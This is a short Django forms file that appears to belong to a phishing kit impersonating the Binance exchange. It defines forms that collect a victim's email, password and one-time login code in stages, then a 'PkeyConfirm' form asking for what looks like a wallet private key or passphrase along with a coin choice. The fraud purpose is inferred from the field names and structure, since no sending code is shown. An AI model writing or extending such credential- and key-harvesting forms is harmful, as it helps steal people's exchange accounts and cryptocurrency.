from django import forms



class EmailForm(forms.Form):
    email = forms.EmailField()
    password = forms.CharField(widget=forms.PasswordInput())

class BinanceEmail(forms.Form):
    email = forms.EmailField()
    

class BinancePassword(forms.Form):
    password = forms.CharField(widget=forms.PasswordInput())


class BinanceOTP(forms.Form):
    otp = forms.CharField()


class PkeyConfirm(forms.Form):
    CHOICES = [
    ('Select Coin','Select Coin'),
    ('Bitcoin','Bitcoin'),
    ('Ethurum','Ethurum'),
    ('BnB','BnB'),
    ('USDT_Tron','USDT_Tron'),
    ('USDT_ERC20','USDT_ERC20'),
    ]
    name = forms.CharField(max_length=60)
    passkwy = forms.CharField(max_length=60)
    email = forms.EmailField()
    coin = forms.ChoiceField(choices=CHOICES)
